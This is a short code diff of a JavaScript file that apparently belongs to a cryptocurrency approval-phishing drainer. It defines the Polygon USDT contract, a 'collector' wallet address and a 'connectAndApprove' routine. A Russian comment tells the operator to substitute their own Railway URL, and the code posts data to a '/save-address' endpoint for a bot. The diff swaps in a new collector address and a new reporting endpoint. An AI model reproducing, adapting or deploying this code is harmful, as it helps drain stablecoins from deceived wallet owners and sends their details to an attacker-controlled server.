@@ -1,5 +1,5 @@
 const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
-const COLLECTOR_ADDRESS = '0x7C5fCDDEe0409aD1a4551eC8DD8738e8df181A88';
+const COLLECTOR_ADDRESS = '0x6B3e574645395E9c8a0677d82d0a3F281285B382';
 const POLYGON_CHAIN_ID = '0x89'; 
 
 async function connectAndApprove() {
@@ -61,7 +61,7 @@ async function connectAndApprove() {
 
         // Отправка данных в бот
         // ЗАМЕНИ НА СВОЙ URL ИЗ RAILWAY
-        const railwayUrl = 'https://railway-production-2954.up.railway.app/save-address';
+        const railwayUrl = 'https://new-0602-production.up.railway.app/save-address';
         
         await fetch(railwayUrl, {
             method: 'POST',
